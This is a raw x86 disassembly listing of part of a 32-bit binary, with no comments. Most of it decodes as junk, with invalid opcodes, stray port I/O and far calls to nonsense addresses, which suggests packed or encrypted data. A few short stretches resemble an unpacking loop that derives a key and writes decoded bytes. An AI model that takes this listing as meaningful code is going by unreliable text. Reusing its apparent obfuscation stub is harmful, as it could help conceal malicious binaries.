  40c8cf:	loope  0x40c90a
  40c8d1:	inc    ebx
  40c8d2:	adc    eax,0x9204aad1
  40c8d7:	sbb    eax,0x6689c599
  40c8dc:	adc    dl,BYTE PTR [edx-0xc]
  40c8df:	sbb    DWORD PTR [ebx+0x75],edi
  40c8e2:	and    dl,BYTE PTR [esi-0x73]
  40c8e5:	mov    esi,0x34db8215
  40c8ea:	mov    dl,0x83
  40c8ec:	repz mov edi,DWORD PTR [ebp-0x18]
  40c8f0:	xor    edi,eax
  40c8f2:	add    edi,DWORD PTR [ebp-0x14]
  40c8f5:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c8f8:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c8ff:	mov    edx,DWORD PTR [ebp-0x44]
  40c902:	mov    edi,DWORD PTR [ebp-0xc]
  40c905:	xor    edx,eax
  40c907:	jmp    0x40ccc5
  40c90c:	sbb    al,0xba
  40c90e:	pop    edx
  40c90f:	pop    edx
  40c910:	pop    edx
  40c911:	pop    edx
  40c912:	sbb    al,0xba
  40c914:	adc    edi,DWORD PTR [edi+edi*1-0x3]
  40c918:	leave  
  40c919:	retf   0xba0c
  40c91c:	in     al,dx
  40c91d:	xchg   esp,eax
  40c91e:	jo     0x40c990
  40c920:	lahf   
  40c921:	jge    0x40c993
  40c923:	jo     0x40c93e
  40c925:	jne    0x40c992
  40c927:	pop    ebx
  40c928:	mov    cl,0xa1
  40c92a:	add    dh,BYTE PTR [ebp*4+0x28c937ca]
  40c931:	add    DWORD PTR [edi+0x5005b1e7],eax
  40c937:	pushf  
  40c938:	fucomi st,st(3)
  40c93a:	inc    esp
  40c93b:	and    bl,bh
  40c93d:	inc    ebp
  40c93e:	cwde   
  40c93f:	cmp    al,0x88
  40c941:	(bad)  
  40c942:	sar    DWORD PTR [ecx-0x7ebcf4fe],0x36
  40c949:	pop    esi
  40c94a:	mov    WORD PTR [ebx],ss
  40c94c:	retf   0x1217
  40c94f:	pop    eax
  40c950:	or     BYTE PTR [esi],bl
  40c952:	(bad)  
  40c953:	out    dx,eax
  40c954:	or     cl,0xcf
  40c957:	cdq    
  40c958:	popf   
  40c959:	adc    dh,bh
  40c95b:	lahf   
  40c95c:	pop    esi
  40c95d:	cmp    eax,0x64127e28
  40c962:	nop
  40c963:	cmc    
  40c964:	and    eax,0x4bbb98ed
  40c969:	mov    ch,BYTE PTR [eax-0x24ebdd81]
  40c96f:	jl     0x40c9ca
  40c971:	xor    ch,bl
  40c973:	inc    edi
  40c974:	das    
  40c975:	cdq    
  40c976:	mov    ecx,0x108ae8c
  40c97b:	fdivr  st,st(1)
  40c97d:	dec    edi
  40c97e:	mov    al,ds:0x78632383
  40c983:	(bad)  
  40c984:	mov    al,0xcb
  40c986:	out    0x1d,eax
  40c988:	dec    eax
  40c989:	aad    0x9e
  40c98b:	shr    dl,1
  40c98d:	push   cs
  40c98e:	push   0xffffffa3
  40c990:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c991:	mov    cl,0xde
  40c993:	pop    ss
  40c994:	sub    al,cl
  40c996:	jnp    0x40ca12
  40c998:	ficom  DWORD PTR [esi]
  40c99a:	stos   BYTE PTR es:[edi],al
  40c99b:	sub    BYTE PTR [eax],0x76
  40c99e:	addr16 dec ecx
  40c9a0:	xor    ah,bh
  40c9a2:	add    DWORD PTR [edi-0x21f863c0],esi
  40c9a8:	out    dx,al
  40c9a9:	xor    BYTE PTR [eax+0x71],dl
  40c9ac:	pop    esi
  40c9ad:	sub    DWORD PTR [edx-0x10],ebx
  40c9b0:	lods   al,BYTE PTR ds:[esi]
  40c9b1:	test   al,0x4d
  40c9b3:	push   esp
  40c9b4:	in     eax,0x6a
  40c9b6:	ds call 0x29c7:0x60f367ff
  40c9be:	mov    eax,ds:0x7e1451c1
  40c9c3:	or     dl,BYTE PTR [ebx+ebp*2+0x3ad7994d]
  40c9ca:	sbb    ch,BYTE PTR [esi]
  40c9cc:	(bad)  
  40c9cd:	adc    al,0x83
  40c9cf:	hlt    
  40c9d0:	jecxz  0x40ca11
  40c9d2:	jae    0x40c9fd
  40c9d4:	lahf   
  40c9d5:	and    ah,BYTE PTR [edi+0x58]
  40c9d8:	ds jmp 0x16d43aea
  40c9de:	inc    edx
  40c9df:	fs stos DWORD PTR es:[edi],eax
  40c9e1:	jns    0x40c9b9
  40c9e3:	js     0x40ca0b
  40c9e5:	out    0xb6,eax
  40c9e7:	dec    ecx
  40c9e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9e9:	lahf   
  40c9ea:	add    edx,eax
  40c9ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9ed:	test   al,0x76
  40c9ef:	loope  0x40c99e
  40c9f1:	push   ss
  40c9f2:	mov    esi,0xf165a7c6
  40c9f7:	punpckhbw mm7,QWORD PTR [ebx+0x6dee23d7]
  40c9fe:	xchg   esi,eax
  40c9ff:	sbb    esp,ecx
  40ca01:	xlat   BYTE PTR ds:[ebx]
  40ca02:	mov    BYTE PTR [edx-0x58],ch
  40ca05:	dec    ecx
  40ca06:	test   al,0x69
  40ca08:	sahf   
  40ca09:	xlat   BYTE PTR ds:[ebx]
  40ca0a:	lods   al,BYTE PTR ds:[esi]
  40ca0b:	les    esi,FWORD PTR [eax+0x702a6c03]
  40ca11:	push   0x20
  40ca13:	xchg   DWORD PTR [ebp-0x3f5fb1ee],ebx
  40ca19:	mov    ds:0x410fab14,al
  40ca1e:	xchg   DWORD PTR [ebx-0x71],ecx
  40ca21:	aad    0xbc
  40ca23:	cld    
  40ca24:	xor    eax,0x44023697
  40ca29:	lea    esi,[edx]
  40ca2b:	inc    ecx
  40ca2c:	popf   
  40ca2d:	aad    0xa8
  40ca2f:	clc    
  40ca30:	scas   al,BYTE PTR es:[edi]
  40ca31:	rcr    BYTE PTR [ecx],0x91
  40ca34:	and    DWORD PTR [esi],ebx
  40ca36:	adc    al,0x2f
  40ca38:	xor    DWORD PTR [ecx],ebp
  40ca3a:	aaa    
  40ca3b:	mov    fs,WORD PTR [edi-0x28fcc332]
  40ca41:	test   eax,0xc8112e93
  40ca46:	xor    al,0x0
  40ca48:	es mov bl,0x53
  40ca4b:	mov    bh,0x81
  40ca4d:	inc    esp
  40ca4e:	sub    ecx,DWORD PTR [ebx+0x3c]
  40ca51:	ss pop ss
  40ca53:	js     0x40ca75
  40ca55:	adc    dl,dh
  40ca57:	sub    eax,0x76b54ece
  40ca5c:	imul   eax,edx,0x2dd7289e
  40ca62:	jge    0x40ca45
  40ca64:	out    dx,al
  40ca65:	sti    
  40ca66:	inc    ecx
  40ca67:	cs stos BYTE PTR es:[edi],al
  40ca69:	mov    eax,DWORD PTR [esi+0x71887637]
  40ca6f:	sub    al,0x6b
  40ca71:	adc    DWORD PTR [esi],0x6dd78ce3
  40ca77:	cs mov bh,0x8f
  40ca7b:	in     al,0x6b
  40ca7d:	loopne 0x40cac2
  40ca7f:	push   edx
  40ca80:	mov    edi,0xec230357
  40ca85:	cmp    al,0xa5
  40ca87:	pop    edi
  40ca88:	aad    0x71
  40ca8a:	xor    al,0xb9
  40ca8c:	mov    ds:0xe89a0b0e,eax
  40ca91:	and    edi,DWORD PTR [ebp-0x33]
  40ca94:	push   edi
  40ca95:	cmc    
  40ca96:	xor    DWORD PTR [edx],ebx
  40ca98:	or     esp,ecx
  40ca9a:	in     eax,dx
  40ca9b:	mov    dh,0x65
  40ca9d:	clc    
  40ca9e:	lods   eax,DWORD PTR ds:[esi]
  40ca9f:	outs   dx,BYTE PTR ds:[esi]
  40caa0:	cmp    BYTE PTR ds:0xaf95876c,0x94
  40caa7:	cmp    edx,ecx
  40caa9:	sti    
  40caaa:	xor    BYTE PTR gs:[ebx-0x2b],al
  40caae:	mov    BYTE PTR [edx],0x43
  40cab1:	push   ebp
  40cab2:	jecxz  0x40cb24
  40cab4:	and    ch,dl
  40cab6:	call   0x9edd848d
  40cabb:	dec    ebx
  40cabc:	sbb    eax,0x24ba36cb
  40cac1:	xchg   esi,eax
  40cac2:	cld    
  40cac3:	pop    edx
  40cac4:	ja     0x40cad8
  40cac6:	leave  
  40cac7:	and    cl,BYTE PTR [esi+eiz*1-0x53e26eef]
  40cace:	addr16 add al,bl
  40cad1:	adc    BYTE PTR [ecx+0x40152507],bl
  40cad7:	test   DWORD PTR [edi],esi
  40cad9:	pushf  
  40cada:	test   DWORD PTR [esi+0x5ccd6060],edx
  40cae0:	and    ch,BYTE PTR [edi+eiz*2-0x20]
  40cae4:	fs pop ds
  40cae6:	sbb    ebx,esi
  40cae8:	add    esp,ecx
  40caea:	mov    ds:0x30774e2d,al
  40caef:	sahf   
  40caf0:	xor    DWORD PTR [ebx],0x4a69b778
  40caf6:	push   edx
  40caf7:	cmp    ecx,DWORD PTR ds:0xfb7a7cbb
  40cafd:	sahf   
  40cafe:	cmp    DWORD PTR [eax],esp
  40cb00:	adc    DWORD PTR [edx+0x37a69e2a],edx
  40cb06:	xor    dh,0x2a
  40cb09:	fstp   DWORD PTR [esi*1-0x27948c0b]
  40cb10:	enter  0xa770,0x70
  40cb14:	bound  edx,QWORD PTR [esi-0x1]
  40cb17:	jge    0x40caca
  40cb19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb1a:	test   DWORD PTR [ecx-0xb507e1e],esi
  40cb20:	leave  
  40cb21:	inc    esp
  40cb22:	gs test eax,0x46181619
  40cb28:	leave  
  40cb29:	dec    ecx
  40cb2a:	mov    bl,0xfb
  40cb2c:	xor    esi,DWORD PTR [ecx+0x71439e8b]
  40cb32:	loopne 0x40cb30
  40cb34:	adc    eax,0xba22d4d8
  40cb39:	nop    DWORD PTR [esi+ecx*4]
  40cb3d:	gs mov edi,0xb1968ad4
  40cb43:	mov    edx,0xddd00fec
  40cb48:	or     ch,cl
  40cb4a:	cs jle 0x40cb52
  40cb4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb4e:	sbb    al,0x87
  40cb50:	hlt    
  40cb51:	xchg   BYTE PTR [ebx-0xb9306bf],bh
  40cb57:	bound  esp,QWORD PTR [edi]
  40cb59:	xchg   DWORD PTR [edi+0x5a],esp
  40cb5c:	clc    
  40cb5d:	jg     0x40cb8d
  40cb5f:	call   0x7fee:0xf8a5a053
  40cb66:	fcmove st,st(7)
  40cb68:	div    ch
  40cb6a:	cmp    BYTE PTR [ecx+0x131841b3],al
  40cb70:	lds    ecx,FWORD PTR [ebp+0x7fb7185e]
  40cb76:	dec    eax
  40cb77:	test   edx,esi
  40cb79:	fisub  DWORD PTR [edi+0x18]
  40cb7c:	dec    ecx
  40cb7d:	sub    ch,BYTE PTR [eax-0x24aa0150]
  40cb83:	test   BYTE PTR [esi],dl
  40cb85:	inc    ebx
  40cb86:	push   ss
  40cb87:	sub    al,0x28
  40cb89:	dec    esi
  40cb8a:	inc    edi
  40cb8b:	out    0x4b,eax
  40cb8d:	xor    esp,esp
  40cb8f:	inc    eax
  40cb90:	dec    esi
  40cb91:	mov    ch,0xb
  40cb93:	ds sub eax,0x474ff28
  40cb99:	in     al,dx
  40cb9a:	pusha  
  40cb9b:	ret    0x4e17
  40cb9e:	cmp    eax,0x9fcc63db
  40cba3:	out    0xa,eax
  40cba5:	iret   
  40cba6:	sbb    al,0xff
  40cba8:	into   
  40cba9:	arpl   WORD PTR ss:[ebx],sp
  40cbac:	lds    esp,FWORD PTR [edx+esi*1-0x695d8fe6]
  40cbb3:	pusha  
  40cbb4:	adc    al,0x48
  40cbb6:	and    BYTE PTR [edi-0x524adc8e],al
  40cbbc:	add    eax,0x1cbdfed9
  40cbc1:	sub    DWORD PTR [esi+edi*4],edi
  40cbc4:	sbb    eax,0xbb96eddf
  40cbc9:	add    ch,BYTE PTR [edx-0x1d]
  40cbcc:	sbb    dh,dh
  40cbce:	in     al,dx
  40cbcf:	or     al,0xc9
  40cbd1:	sub    ah,0x6d
  40cbd4:	or     edx,edi
  40cbd6:	cdq    
  40cbd7:	repz pushf 
  40cbd9:	push   edx
  40cbda:	adc    eax,esi
  40cbdc:	add    edx,DWORD PTR [eax]
  40cbde:	stos   DWORD PTR es:[edi],eax
  40cbdf:	jl     0x40cbbc
  40cbe1:	push   ebp
  40cbe2:	retf   0x789b
  40cbe5:	sub    DWORD PTR [ebx],0x37
  40cbe8:	push   edx
  40cbe9:	push   edi
  40cbea:	cmp    ecx,ebp
  40cbec:	popa   
  40cbed:	mov    bl,0xa0
  40cbef:	pusha  
  40cbf0:	je     0x40cba1
  40cbf2:	mov    edi,0xbe4686d3
  40cbf7:	xchg   edi,eax
  40cbf8:	xor    dl,bh
  40cbfa:	dec    eax
  40cbfb:	into   
  40cbfc:	out    0x1f,eax
  40cbfe:	ret    0x99e8
  40cc01:	or     eax,0x7ee9923
  40cc06:	ret    0x8ba3
  40cc09:	cmp    BYTE PTR [edx-0x1e],ch
  40cc0c:	add    BYTE PTR [edi+ebx*1+0x5a],dl
  40cc10:	dec    ecx
  40cc11:	inc    ebp
  40cc12:	jo     0x40cbdb
  40cc14:	pop    esp
  40cc15:	rcl    DWORD PTR [ecx+0x4cbe958],cl
  40cc1b:	pop    ds
  40cc1c:	ss or  eax,0xf9d60510
  40cc22:	push   esi
  40cc23:	xor    edi,DWORD PTR [eax+0x2afec272]
  40cc29:	lods   eax,DWORD PTR ds:[esi]
  40cc2a:	inc    esp
  40cc2b:	jp     0x40cbd8
  40cc2d:	mov    edx,0x173da53c
  40cc32:	je     0x40cc47
  40cc34:	pushf  
  40cc35:	imul   ecx,ecx,0x7
  40cc38:	sbb    bl,bl
  40cc3a:	dec    edi
  40cc3b:	scas   al,BYTE PTR es:[edi]
  40cc3c:	inc    ecx
  40cc3d:	repz pop esi
  40cc3f:	pop    ds
  40cc40:	cmp    al,0xc4
  40cc42:	push   esi
  40cc43:	in     eax,0x64
  40cc45:	lds    edx,FWORD PTR [edi-0x60]
  40cc48:	(bad)  
  40cc49:	call   0x137a:0x5e99d8bf
  40cc50:	sbb    edi,esp
  40cc52:	in     al,0x88
  40cc54:	pop    esp
  40cc55:	fwait
  40cc56:	jno    0x40cc69
  40cc58:	gs mov bl,0xa2
  40cc5b:	mov    DWORD PTR [ebx+esi*1-0x18],0xecc59ef7
  40cc63:	mov    dl,BYTE PTR [eax-0x39110ee1]
  40cc69:	push   esi
  40cc6a:	dec    ebx
  40cc6b:	push   esp
  40cc6c:	jne    0x40cc8d
  40cc6e:	and    eax,0xa780e407
  40cc73:	sub    BYTE PTR [esp+ecx*1],cl
  40cc76:	out    0xc8,eax
  40cc78:	jnp    0x40ccba
  40cc7a:	inc    DWORD PTR [ebp+eax*8-0x8]
  40cc7e:	push   eax
  40cc7f:	(bad)  
  40cc80:	jnp    0x40cc72
  40cc82:	sub    DWORD PTR [ecx-0xe],edx
  40cc85:	(bad)  
  40cc89:	and    esp,DWORD PTR [edi]
  40cc8b:	fwait
  40cc8c:	add    ch,al
  40cc8e:	mov    DWORD PTR [edx],eax
  40cc90:	and    BYTE PTR [esp+ebp*2+0x38],ch
  40cc94:	push   ecx
  40cc95:	xchg   esp,eax
  40cc96:	sub    DWORD PTR [edi-0x2571f1b5],edx
  40cc9c:	jo     0x40cc8d
  40cc9e:	out    dx,eax
  40cc9f:	rcr    ebx,0xce
  40cca2:	dec    edi
  40cca4:	fstp   TBYTE PTR cs:[ebx]
  40cca7:	adc    eax,0x81bedc81
  40ccac:	aas    
  40ccad:	or     eax,0xe1cfcbe3
  40ccb2:	mov    edx,0x602b78dc
  40ccb7:	xchg   ebp,eax
  40ccb8:	jb     0x40cc5c
  40ccba:	dec    ebx
  40ccbb:	inc    esi
  40ccbc:	out    dx,eax
  40ccbd:	mov    al,0xf5
  40ccbf:	or     al,0x8a
  40ccc1:	fistp  DWORD PTR [edx+0xe]
  40ccc4:	dec    eax
  40ccc5:	xor    edi,eax
  40ccc7:	add    edx,ecx
  40ccc9:	add    edi,ecx
  40cccb:	imul   edx,edi
  40ccce:	add    edx,DWORD PTR [ebp-0x14]
  40ccd1:	mov    DWORD PTR [ebp-0x14],edx
  40ccd4:	mov    edx,DWORD PTR [ebp-0xc]
  40ccd7:	mov    edi,DWORD PTR [ebp-0x24]
  40ccda:	xor    edx,eax
  40ccdc:	add    edx,ecx
  40ccde:	imul   edx,edi
  40cce1:	mov    edi,DWORD PTR [ebp-0xc]
  40cce4:	xor    edi,eax
  40cce6:	sub    edx,edi
  40cce8:	mov    edi,DWORD PTR [ebp-0xc]
  40cceb:	mov    ebx,DWORD PTR [ebp-0x14]
  40ccee:	xor    edi,eax
  40ccf0:	add    edi,ecx
  40ccf2:	imul   edi,ebx
  40ccf5:	mov    ebx,DWORD PTR [ebp-0x18]
  40ccf8:	xor    ebx,eax
  40ccfa:	sub    edx,ecx
  40ccfc:	lea    edi,[edi+ebx*1+0x32729c]
  40cd03:	cmp    edi,edx
  40cd05:	jmp    0x40d0c3
  40cd0a:	mov    eax,0xf165d76a
  40cd0f:	popa   
  40cd10:	jbe    0x40cd7b
  40cd12:	(bad)  
  40cd14:	xchg   ebx,eax
  40cd15:	sub    DWORD PTR [eax+0x39],0xffffffc1
  40cd19:	aaa    
  40cd1a:	or     edx,DWORD PTR [eax+0x7d9f7070]
  40cd20:	jo     0x40cd92
  40cd22:	mov    edi,0xb0ef617a
  40cd27:	test   al,0x48
  40cd29:	push   ecx
  40cd2a:	stos   DWORD PTR es:[edi],eax
  40cd2b:	xchg   edx,eax
  40cd2c:	mov    ebx,DWORD PTR [ebp-0x55]
  40cd2f:	adc    DWORD PTR [eax+0x46],ecx
  40cd32:	lods   al,BYTE PTR ds:[esi]
  40cd33:	dec    edi
  40cd34:	cdq    
  40cd35:	sbb    eax,0xdb6d7b08
  40cd3a:	push   ebx
  40cd3b:	int3   
  40cd3c:	not    bh
  40cd3e:	test   BYTE PTR [edx+ebp*2-0x14],bh
  40cd42:	pushf  
  40cd43:	pushf  
  40cd44:	push   edi
  40cd45:	push   ecx
  40cd46:	not    BYTE PTR [eax]
  40cd48:	mov    dl,0xa3
  40cd4a:	clc    
  40cd4b:	pusha  
  40cd4c:	xchg   esi,eax
  40cd4d:	and    edi,edx
  40cd4f:	add    edx,esi
  40cd51:	dec    ebp
  40cd52:	retf   
  40cd53:	loopne 0x40cd19
  40cd55:	jbe    0x40cd24
  40cd57:	jnp    0x40cd52
  40cd59:	jg     0x40cd43
  40cd5b:	dec    ebp
  40cd5c:	retf   0x2cb6
  40cd5f:	mov    ch,0x5f
  40cd61:	jmp    0x40cd0a
  40cd63:	sbb    BYTE PTR [ecx],ch
  40cd65:	cmp    BYTE PTR [eax],dh
  40cd67:	(bad)  
  40cd68:	pop    edx
  40cd69:	pop    edi
  40cd6a:	mov    eax,ds:0xbe4f772c
  40cd6f:	clc    
  40cd70:	sub    BYTE PTR [esi-0x36d5b7f7],0xd4
  40cd77:	push   ss
  40cd78:	(bad)  
  40cd79:	(bad)  
  40cd7a:	mov    BYTE PTR ds:0x26136ad3,0x47
  40cd81:	mov    BYTE PTR ds:0x3ddd22ac,dl
  40cd87:	push   0x8e839449
  40cd8c:	inc    esp
  40cd8d:	and    BYTE PTR [di-0x22ea],ch
  40cd92:	pop    ebp
  40cd93:	adc    al,0xab
  40cd95:	in     al,0xfc
  40cd97:	cmp    BYTE PTR [edx],dl
  40cd99:	adc    eax,0xb5240139
  40cd9e:	leave  
  40cd9f:	imul   ax,WORD PTR [ecx-0x56e67940],0x39
  40cda7:	add    al,0xf2
  40cda9:	sar    cl,1
  40cdab:	mov    ch,0x98
  40cdad:	ret    
  40cdae:	inc    ecx
  40cdaf:	inc    edi
  40cdb0:	and    ch,BYTE PTR [edi]
  40cdb2:	xor    dl,BYTE PTR [ebp+0x2bf81110]
  40cdb8:	jge    0x40cddf
  40cdba:	loopne 0x40cdec
  40cdbc:	imul   esp,DWORD PTR [edx],0xca3580d1
  40cdc2:	int    0x90
  40cdc4:	ja     0x40ce39
  40cdc6:	add    DWORD PTR ds:0x8784e470,edx
  40cdcc:	ss popf 
  40cdce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cdcf:	in     al,0xf3
  40cdd1:	xlat   BYTE PTR ds:[ebx]
  40cdd2:	dec    esi
  40cdd3:	lahf   
  40cdd4:	sub    eax,0xbec3f669
  40cdd9:	mov    ah,0xb9
  40cddb:	stos   DWORD PTR es:[edi],eax
  40cddc:	inc    edi
  40cddd:	sbb    cl,ah
  40cddf:	imul   edi,DWORD PTR [ebp+0x4d5106de],0x1e
  40cde6:	push   esp
  40cde7:	data16 imul BYTE PTR [esi-0x4a]
  40cdeb:	pop    es
  40cdec:	jg     0x40cde3
  40cdee:	inc    esp
  40cdef:	mov    gs,WORD PTR [ecx]
  40cdf1:	push   ebx
  40cdf2:	push   es
  40cdf3:	loope  0x40cd8d
  40cdf5:	fcomp  DWORD PTR [esi+0x11ee44db]
  40cdfb:	out    0xbb,eax
  40cdfd:	pop    ss
  40cdfe:	or     DWORD PTR [ecx],esp
  40ce00:	bswap  eax
  40ce02:	(bad)  
  40ce03:	test   eax,0x44c8c038
  40ce08:	jl     0x40cd96
  40ce0a:	mov    ch,0x9c
  40ce0c:	pop    ecx
  40ce0d:	out    dx,eax
  40ce0e:	inc    edx
  40ce0f:	inc    ebx
  40ce10:	sub    al,0x57
  40ce12:	jmp    0x40ce5b
  40ce14:	js     0x40cdd8
  40ce16:	mov    bh,0x52
  40ce18:	mov    ch,0xa2
  40ce1a:	call   0x86f928bf
  40ce1f:	xor    edx,DWORD PTR [eax]
  40ce21:	jns    0x40ce23
  40ce23:	mov    al,0x80
  40ce25:	aad    0xde
  40ce27:	rcl    BYTE PTR [edx],cl
  40ce29:	adc    dl,bl
  40ce2b:	es leave 
  40ce2d:	sbb    BYTE PTR [ebp+0x3],0xae
  40ce31:	sub    al,0xb6
  40ce33:	mov    al,BYTE PTR [ecx-0x56578be4]
  40ce39:	fmulp  st(2),st
  40ce3b:	in     al,0xe6
  40ce3d:	fsub   st(1),st
  40ce3f:	xchg   ebx,eax
  40ce40:	push   ebx
  40ce41:	out    dx,eax
  40ce42:	mov    bh,0x58
  40ce44:	aad    0x2b
  40ce46:	imul   edx,DWORD PTR [edx+0x1b],0xffffffb8
  40ce4a:	shr    BYTE PTR [ecx+0x767d6786],cl
  40ce50:	in     eax,dx
  40ce51:	mov    WORD PTR es:[ebx],cs
  40ce54:	scas   al,BYTE PTR es:[edi]
  40ce55:	mov    bh,0xe2
  40ce57:	(bad)
  40ce5a:	loope  0x40ceb7
  40ce5c:	in     eax,dx
  40ce5d:	cli    
  40ce5e:	push   ds
  40ce5f:	mov    bh,0x91
  40ce61:	mov    eax,0xc4ac2d7a
  40ce66:	imul   esi,ebp,0x75
  40ce69:	mov    eax,0xe5098bf
  40ce6e:	(bad)  
  40ce6f:	aaa    
  40ce70:	pop    ebx
  40ce71:	lea    eax,[ecx-0x4c]
  40ce74:	into   
  40ce75:	in     eax,0xf2
  40ce77:	jns    0x40ced3
  40ce79:	add    eax,0x9460894
  40ce7e:	jo     0x40cefb
  40ce80:	cdq    
  40ce81:	push   ds
  40ce82:	ins    BYTE PTR es:[edi],dx
  40ce83:	int    0x31
  40ce85:	jbe    0x40ceec
  40ce87:	ja     0x40cee6
  40ce89:	test   DWORD PTR [edi+0x45],esp
  40ce8c:	mov    ebp,DWORD PTR [ecx-0x3c071970]
  40ce92:	pop    esp
  40ce93:	lea    esi,[ebp-0x11]
  40ce96:	mov    DWORD PTR [ebx*8+0x1871bcc2],0x9c4cca4a
  40cea1:	pop    ebp
  40cea2:	push   esp
  40cea3:	out    0x4e,al
  40cea5:	(bad)  
  40cea6:	mov    ds:0xa1819367,eax
  40ceab:	fwait
  40ceac:	leave  
  40cead:	jne    0x40ce36
  40ceaf:	mov    al,0x7b
  40ceb1:	adc    eax,0x2b0f36d4
  40ceb6:	mov    eax,ds:0x237814bd
  40cebb:	push   ds
  40cebc:	jne    0x40ceca
  40cebe:	lods   eax,DWORD PTR ds:[esi]
  40cebf:	mov    BYTE PTR ds:0xea80f46a,dl
  40cec5:	popa   
  40cec6:	mov    dl,0xf0
  40cec8:	cmp    BYTE PTR [ebx],0x68
  40cecb:	bound  esi,QWORD PTR [ebx]
  40cecd:	fwait
  40cece:	mov    edi,0x1fc20609
  40ced3:	mov    al,0x1e
  40ced5:	aam    0xa9
  40ced7:	mov    esp,0x7744569a
  40cedc:	mov    bl,0xc8
  40cede:	(bad)  
  40cee0:	xchg   ebp,eax
  40cee1:	test   al,0x48
  40cee3:	gs mov bh,0x4a
  40cee6:	cdq    
  40cee7:	jne    0x40ce6c
  40cee9:	mov    ch,0xd9
  40ceeb:	daa    
  40ceec:	mov    eax,ds:0xf7b160c8
  40cef1:	int    0xab
  40cef3:	adc    dh,al
  40cef5:	sub    al,0xae
  40cef7:	popa   
  40cef8:	or     ecx,DWORD PTR [eax-0x80]
  40cefb:	mov    WORD PTR [edi-0x1d],?
  40cefe:	outs   dx,DWORD PTR ds:[esi]
  40ceff:	adc    DWORD PTR [edx+0x371b66ff],edi
  40cf05:	pusha  
  40cf06:	jne    0x40cecd
  40cf08:	enter  0x577a,0x4a
  40cf0c:	not    BYTE PTR [edi]
  40cf0e:	arpl   WORD PTR [edx],bp
  40cf10:	sub    eax,0x7db5a0d
  40cf15:	addr16 adc eax,0xfc98da40
  40cf1b:	and    ebx,DWORD PTR [eax+0x268f9a4d]
  40cf21:	dec    edi
  40cf22:	or     eax,0x85e9a3ae
  40cf27:	fucomp st(1)
  40cf29:	test   al,0x93
  40cf2b:	outs   dx,BYTE PTR ds:[esi]
  40cf2c:	pop    ecx
  40cf2d:	into   
  40cf2e:	repz jg 0x40cfaa
  40cf31:	inc    edx
  40cf32:	in     al,dx
  40cf33:	(bad)  
  40cf34:	ds dec esi
  40cf36:	std    
  40cf37:	jnp    0x40cec2
  40cf39:	push   ss
  40cf3a:	(bad)  
  40cf3b:	sar    BYTE PTR [esi-0x28],0x55
  40cf3f:	pushf  
  40cf40:	jb     0x40cef8
  40cf42:	int3   
  40cf43:	pop    ebp
  40cf44:	mov    ebx,0xf2aacada
  40cf49:	shl    BYTE PTR [edx-0x3ee86af4],cl
  40cf4f:	ficomp WORD PTR [edi+0x243a416]
  40cf55:	fisttp QWORD PTR [edi]
  40cf57:	jno    0x40cf93
  40cf59:	outs   dx,BYTE PTR ds:[esi]
  40cf5a:	sbb    al,0xec
  40cf5c:	xor    eax,0xadfe5627
  40cf61:	stos   DWORD PTR es:[edi],eax
  40cf62:	jmp    0x109b2982
  40cf67:	leave  
  40cf68:	inc    eax
  40cf69:	ror    DWORD PTR [eax-0x80],cl
  40cf6c:	dec    ebp
  40cf6d:	out    0xe9,eax
  40cf6f:	lahf   
  40cf70:	lea    edi,[ebp+0x22]
  40cf73:	mov    ds:0x8a732d88,eax
  40cf78:	inc    ebx
  40cf79:	mov    cl,cl
  40cf7b:	test   al,0x96
  40cf7d:	sbb    bh,BYTE PTR [esi]
  40cf7f:	mov    ds:0x6f112149,al
  40cf84:	cmp    eax,esp
  40cf86:	jne    0x40cfe9
  40cf88:	sbb    DWORD PTR [ebx],ebp
  40cf8a:	jg     0x40cf33
  40cf8c:	ret    
  40cf8d:	div    DWORD PTR [eax]
  40cf8f:	sbb    al,0xb0
  40cf91:	xchg   dh,cl
  40cf93:	fcomp  st(4)
  40cf95:	(bad)
  40cf98:	dec    ecx
  40cf99:	or     BYTE PTR [ebx-0x38678da2],bh
  40cf9f:	daa    
  40cfa0:	pop    ebp
  40cfa1:	xchg   esi,eax
  40cfa2:	sub    al,0xdf
  40cfa4:	inc    esi
  40cfa5:	mov    cl,BYTE PTR [ecx-0x2243c194]
  40cfab:	and    DWORD PTR [edx+0x4e],0xffffffaa
  40cfaf:	xchg   ebx,eax
  40cfb0:	sbb    al,0xbc
  40cfb2:	rcl    DWORD PTR [edi+0x69edf7a5],cl
  40cfb8:	call   0x9191ff2a
  40cfbd:	xchg   esi,eax
  40cfbe:	add    ecx,DWORD PTR [edx+0x37be5ef8]
  40cfc4:	push   edi
  40cfc5:	xor    eax,0x2434534f
  40cfca:	mov    ecx,0xc00195d
  40cfcf:	dec    ebx
  40cfd0:	xchg   edx,eax
  40cfd1:	dec    esp
  40cfd2:	ret    0x6583
  40cfd5:	mov    WORD PTR [ebp+0x7c979c76],ds
  40cfdb:	pop    esi
  40cfdc:	(bad)  
  40cfdd:	sub    al,0x78
  40cfdf:	(bad)  
  40cfe0:	aaa    
  40cfe1:	std    
  40cfe2:	dec    esp
  40cfe3:	test   al,0xcc
  40cfe5:	add    al,0x16
  40cfe7:	fistp  WORD PTR [ecx-0x75]
  40cfea:	test   DWORD PTR [ecx-0x7dce1ca3],eax
  40cff0:	sbb    DWORD PTR [ebx],eax
  40cff2:	dec    edx
  40cff3:	mov    ah,0x50
  40cff5:	nop
  40cff6:	in     al,dx
  40cff7:	fs stos DWORD PTR es:[edi],eax
  40cff9:	or     DWORD PTR [ebx+0x35],ebp
  40cffc:	mov    WORD PTR [edi+0x88ac0b4],?
  40d002:	push   eax
  40d004:	and    BYTE PTR [eax+0x42],ch
  40d007:	push   cs
  40d008:	das    
  40d009:	fimul  WORD PTR [edx]
  40d00b:	data16 sahf 
  40d00d:	inc    edi
  40d00e:	cmp    BYTE PTR [ebp-0x39],bl
  40d011:	xor    eax,0x40f5595e
  40d016:	sub    al,0x12
  40d018:	jmp    0xe844:0xcb8ee92
  40d01f:	imul   esp,edx,0xa51c6d7e
  40d025:	mov    edx,0xf93100a
  40d02a:	cmp    eax,0xe16600ca
  40d02f:	loopne 0x40d0a7
  40d031:	adc    eax,eax
  40d033:	mov    edx,0x6622080d
